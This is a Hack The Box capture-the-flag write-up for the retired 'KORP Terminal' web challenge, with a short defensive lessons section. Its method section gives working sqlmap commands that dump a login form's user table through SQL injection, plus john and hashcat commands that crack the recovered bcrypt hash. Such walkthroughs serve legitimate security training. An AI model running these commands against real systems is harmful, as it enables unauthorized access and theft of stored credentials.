---
challenge: KORP Terminal
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, bcrypt, sqlmap, cyber-apocalypse-2024]
---

# KORP Terminal — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no real flags.

## TL;DR

A fictional terminal login. A single quote triggers a **MySQL error**: there is **SQL injection**. The app still answers **401** while showing the error, so `sqlmap` needs `--ignore-code 401`. Dump the `users` table, crack the **bcrypt** hash, log in as `admin`.

## Evidence

- A web instance with a username/password form.

## Method

1. **Confirm the injection**: `'` in both fields; the SQL error shows in the response.

2. **Automate, ignoring the 401**:

```bash
sqlmap -r login.req --batch --ignore-code 401 --dbs
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal --tables
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal -T users --dump
```

3. **Crack the bcrypt**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# or: hashcat -m 3200
```

4. **Log in** with the recovered credentials: the response carries the flag.

## Pitfalls

- **`--ignore-code 401`**: without it, `sqlmap` gives up treating the endpoint as unreachable.
- **`-r` with the full request**: keep headers and POST method; the injection lives in the body.
- **bcrypt is slow**: few guesses per second; stick to sensible dictionaries.

## Lessons

- A database error exposed in production is a map for the attacker.
- A misleading status code does not stop injection: the response is still valid.
- bcrypt passwords still fall when they are weak.
